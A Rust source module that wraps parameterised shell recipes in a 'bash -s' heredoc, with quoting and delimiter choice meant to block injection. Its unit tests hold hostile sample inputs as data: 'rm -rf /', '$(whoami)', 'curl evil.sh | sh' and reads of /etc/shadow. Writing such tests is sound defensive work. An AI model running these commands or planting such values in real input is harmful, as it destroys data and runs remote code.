//! Turning a recipe plus its parameters into something a shell will run.
//!
//! The shape is:
//!
//! ```bash
//! SSH_PORT='22' ADMIN_USER='alex' bash -s <<'REACH_RECIPE_ab12cd34'
//! ...script...
//! REACH_RECIPE_ab12cd34
//! ```
//!
//! `bash -s` rather than typing the script line by line. Typing is what the
//! MCP tools do, and it is wrong here: there is no exit status, and the first
//! line that prompts for anything swallows the rest of the script as its
//! answer. A heredoc runs the whole thing as one program, so `set -euo
//! pipefail` works, `$?` means something, and the user still sees every line
//! scroll past.
//!
//! The trade is that `bash -s` owns stdin, so a recipe cannot prompt. That is
//! why recipes take parameters instead of asking questions — which is what you
//! want anyway from something meant to be run more than once.

use std::collections::HashMap;

use super::schema::{valid_param_name, Recipe};

/// Why an invocation could not be built.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum InvokeError {
    /// A required parameter has no value.
    MissingParam { name: String, label: String },
    /// A parameter name that is not a shell identifier. Caught at parse time
    /// too; re-checked here because this is the last point before the string
    /// reaches a shell.
    BadParamName(String),
    /// A value containing a NUL, which no shell can carry.
    NulInValue(String),
}

impl std::fmt::Display for InvokeError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            InvokeError::MissingParam { label, .. } => write!(f, "`{label}` is required"),
            InvokeError::BadParamName(n) => write!(f, "Invalid parameter name `{n}`"),
            InvokeError::NulInValue(n) => write!(f, "`{n}` contains a null byte"),
        }
    }
}

/// Wrap a value in single quotes so a shell treats it as one literal token.
///
/// Single quotes suppress every kind of expansion, so the only character that
/// needs handling is the single quote itself: close the string, emit an
/// escaped quote, reopen. `it's` becomes `'it'\''s'`.
///
/// This is the whole security boundary between a parameter and the shell, so
/// it is deliberately the dullest possible implementation.
pub fn shell_quote(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('\'');
    for ch in value.chars() {
        if ch == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    out
}

/// A heredoc delimiter that does not occur in the script.
///
/// A delimiter appearing in the body would end the heredoc early and hand the
/// rest of the recipe to the shell as commands. Derived from the content so it
/// is deterministic and testable, then extended until it is genuinely absent.
fn delimiter_for(script: &str) -> String {
    // FNV-1a. Not for security — just to vary the suffix per script.
    let mut hash: u64 = 0xcbf2_9ce4_8422_2325;
    for byte in script.as_bytes() {
        hash ^= *byte as u64;
        hash = hash.wrapping_mul(0x0000_0100_0000_01b3);
    }

    let mut candidate = format!("REACH_RECIPE_{hash:016x}");
    while script.contains(&candidate) {
        candidate.push('X');
    }
    candidate
}

/// A recipe, its parameters and the command that runs it.
#[derive(Debug, Clone)]
pub struct Invocation {
    /// The exact bytes to write to the session, newline included.
    pub command: String,
    /// The heredoc delimiter chosen, so callers can show or test it.
    pub delimiter: String,
}

/// Build the command for a recipe.
///
/// `values` is what the user filled in. A parameter absent from the map falls
/// back to its default; a parameter with neither is an error rather than an
/// empty string, because `set -u` would fail the script halfway through and
/// leave the machine in a partial state.
pub fn build(recipe: &Recipe, values: &HashMap<String, String>) -> Result<Invocation, InvokeError> {
    let mut assignments = Vec::with_capacity(recipe.params.len());

    for param in &recipe.params {
        if !valid_param_name(&param.name) {
            return Err(InvokeError::BadParamName(param.name.clone()));
        }

        let supplied = values.get(&param.name).map(String::as_str).unwrap_or("");
        let value = if supplied.is_empty() {
            if param.required() {
                return Err(InvokeError::MissingParam {
                    name: param.name.clone(),
                    label: param.label.clone(),
                });
            }
            param.default.as_str()
        } else {
            supplied
        };

        if value.contains('\0') {
            return Err(InvokeError::NulInValue(param.name.clone()));
        }

        assignments.push(format!("{}={}", param.name, shell_quote(value)));
    }

    let delimiter = delimiter_for(&recipe.script);

    // The script must end in a newline or the closing delimiter lands on the
    // same line as the last command and is never recognised.
    let mut body = recipe.script.clone();
    if !body.ends_with('\n') {
        body.push('\n');
    }

    let prefix = if assignments.is_empty() {
        String::new()
    } else {
        format!("{} ", assignments.join(" "))
    };

    // Quoted delimiter: nothing inside the heredoc is expanded by the calling
    // shell, so the script reaches bash exactly as written. Parameters still
    // arrive, because the assignments above are in the child's environment.
    let command = format!("{prefix}bash -s <<'{delimiter}'\n{body}{delimiter}\n");

    Ok(Invocation { command, delimiter })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::recipe::schema::{parse, RecipeParam};

    fn recipe_with(script: &str, params: Vec<RecipeParam>) -> Recipe {
        let mut r = parse("# @reach-recipe\n# id: t\n# name: T\n# @end\nplaceholder\n").unwrap();
        r.script = script.to_string();
        r.params = params;
        r
    }

    fn param(name: &str, default: &str) -> RecipeParam {
        RecipeParam {
            name: name.into(),
            label: name.into(),
            default: default.into(),
        }
    }

    // -- quoting ------------------------------------------------------------

    #[test]
    fn quotes_a_plain_value() {
        assert_eq!(shell_quote("hello"), "'hello'");
    }

    #[test]
    fn quotes_an_embedded_single_quote() {
        assert_eq!(shell_quote("it's"), r#"'it'\''s'"#);
    }

    /// A shell's word-splitting rules, for the subset `shell_quote` emits:
    /// single-quoted literals and backslash escapes. Reading the output back
    /// the way bash would is the only assertion worth making here — counting
    /// quote characters just re-implements the bug.
    fn shell_unquote(s: &str) -> String {
        let mut out = String::new();
        let mut chars = s.chars();
        while let Some(c) = chars.next() {
            match c {
                '\'' => {
                    for inner in chars.by_ref() {
                        if inner == '\'' {
                            break;
                        }
                        out.push(inner);
                    }
                }
                '\\' => {
                    if let Some(escaped) = chars.next() {
                        out.push(escaped);
                    }
                }
                other => out.push(other),
            }
        }
        out
    }

    #[test]
    fn quoting_survives_every_shell_metacharacter() {
        // If any of these survive as syntax rather than data, a parameter is
        // a command. The round-trip is the property that matters: whatever a
        // shell reads back has to equal what went in.
        for hostile in [
            "; rm -rf /",
            "$(whoami)",
            "`id`",
            "&& curl evil.sh | sh",
            "| tee /etc/passwd",
            "$HOME",
            "\n rm -rf /",
            "' ; rm -rf / ; '",
            "'",
            "''",
            r"\' ; id",
            "a'b'c",
            "*",
            "~/../../etc/shadow",
        ] {
            let quoted = shell_quote(hostile);
            assert_eq!(
                shell_unquote(&quoted),
                hostile,
                "quoting {hostile:?} to {quoted} did not round-trip"
            );
        }
    }

    #[test]
    fn the_unquoter_itself_is_honest() {
        // Guard against a round-trip that passes because the test helper is
        // as broken as the thing it checks.
        assert_eq!(shell_unquote("'plain'"), "plain");
        assert_eq!(shell_unquote(r#"'it'\''s'"#), "it's");
        assert_ne!(shell_unquote("'a'"), "b");
    }

    // -- delimiters ---------------------------------------------------------

    #[test]
    fn the_delimiter_never_appears_in_the_script() {
        let d = delimiter_for("echo hi");
        assert!(!"echo hi".contains(&d));
    }

    #[test]
    fn a_script_containing_its_own_delimiter_gets_a_different_one() {
        // A recipe that embeds the delimiter would otherwise close the heredoc
        // early and run its own tail as shell commands.
        let natural = delimiter_for("payload");
        let hostile = format!("payload\n{natural}\nrm -rf /\n");
        let chosen = delimiter_for(&hostile);
        assert!(!hostile.contains(&chosen), "delimiter must be absent from the body");
    }

    #[test]
    fn the_delimiter_is_stable_for_the_same_script() {
        assert_eq!(delimiter_for("same"), delimiter_for("same"));
    }

    // -- assembly -----------------------------------------------------------

    #[test]
    fn builds_a_heredoc_with_no_params() {
        let r = recipe_with("echo hi\n", vec![]);
        let inv = build(&r, &HashMap::new()).unwrap();
        assert!(inv.command.starts_with("bash -s <<'REACH_RECIPE_"));
        assert!(inv.command.contains("\necho hi\n"));
        assert!(inv.command.ends_with(&format!("{}\n", inv.delimiter)));
    }

    #[test]
    fn puts_assignments_before_the_command() {
        let r = recipe_with("echo $PORT\n", vec![param("PORT", "22")]);
        let inv = build(&r, &HashMap::new()).unwrap();
        assert!(inv.command.starts_with("PORT='22' bash -s <<'"), "{}", inv.command);
    }

    #[test]
    fn a_supplied_value_beats_the_default() {
        let r = recipe_with("x\n", vec![param("PORT", "22")]);
        let values = HashMap::from([("PORT".to_string(), "2222".to_string())]);
        assert!(build(&r, &values).unwrap().command.starts_with("PORT='2222' "));
    }

    #[test]
    fn a_missing_required_param_is_an_error_not_an_empty_string() {
        // With `set -u` an empty value fails mid-script, after earlier steps
        // have already changed the machine. Refusing to start is kinder.
        let r = recipe_with("x\n", vec![param("TOKEN", "")]);
        assert!(matches!(
            build(&r, &HashMap::new()),
            Err(InvokeError::MissingParam { .. })
        ));
    }

    #[test]
    fn a_hostile_value_cannot_break_out() {
        let r = recipe_with("echo $NAME\n", vec![param("NAME", "")]);
        let values = HashMap::from([("NAME".to_string(), "'; rm -rf / #".to_string())]);
        let inv = build(&r, &values).unwrap();
        // The payload survives as data, and the shell sees one assignment.
        assert!(inv.command.starts_with("NAME='"));
        assert!(inv.command.contains(r#"'\''; rm -rf / #'"#));
        let first_line = inv.command.lines().next().unwrap();
        assert!(first_line.ends_with(&format!("bash -s <<'{}'", inv.delimiter)));
    }

    #[test]
    fn a_script_without_a_trailing_newline_still_closes() {
        // Otherwise the delimiter shares a line with the last command and the
        // heredoc never terminates — the session hangs waiting for input.
        let r = recipe_with("echo hi", vec![]);
        let inv = build(&r, &HashMap::new()).unwrap();
        assert!(inv.command.contains(&format!("echo hi\n{}\n", inv.delimiter)));
    }

    #[test]
    fn rejects_a_nul_byte() {
        let r = recipe_with("x\n", vec![param("V", "d")]);
        let values = HashMap::from([("V".to_string(), "a\0b".to_string())]);
        assert!(matches!(build(&r, &values), Err(InvokeError::NulInValue(_))));
    }

    #[test]
    fn rejects_a_param_name_that_slipped_past_parsing() {
        let r = recipe_with("x\n", vec![param("BAD;NAME", "d")]);
        assert!(matches!(
            build(&r, &HashMap::new()),
            Err(InvokeError::BadParamName(_))
        ));
    }
}
